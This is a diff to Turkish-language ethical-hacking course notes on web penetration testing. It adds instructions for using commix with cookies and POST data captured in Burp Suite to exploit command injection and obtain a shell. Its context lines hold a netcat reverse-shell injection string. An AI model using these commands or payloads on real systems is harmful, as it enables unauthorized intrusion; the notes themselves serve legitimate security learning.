@@ -341,5 +341,18 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 - ```www.nsa.gov | nc 192.168.123.123 1234 -e /bin/bash``` diyerek giriş yapabiliriz ve terminal üzerinden server'da dolaşabiliriz
 
 > ## Commix
+
+- Komut enjeksiyonunda bulunan açıkları bulur ve bu açıkları exploit eder
+
+! ```cookie``` daha önceden girdiğimiz sitelerdeki bilgilerimiz cookie olarak kaydedilir ve daha sonra tekrar girdiğimizde sitenin bizi tanımasını sağlar (siteye çok giren kişiye ekstra indirim yapılması gibi)
+
+- ```commit -h``` help kısmının açar
+- ```cookie``` kullanan sitelerde ```PHPSESSID``` ve ```target``` bilgilerini kullanırız
+- ```commix --url="<site url'si>" --cookie="<cookie kısmında yazan bilgiler (security level ve PHPSESSID) --data="<target kısımında yazan bilgiler>"``` 
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.27.44.jpeg)
+- ```data ve cookie``` bilgileri ```Burpsuite``` içinde POST'lardan birine tıklayarak elde edebiliriz
+- ```commix``` ile açığı arayıp bulduğu zaman shell oluşturur
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.38.19.jpeg)
+
 > ## SSI Injection low level
 > ## SSI Injection medium level
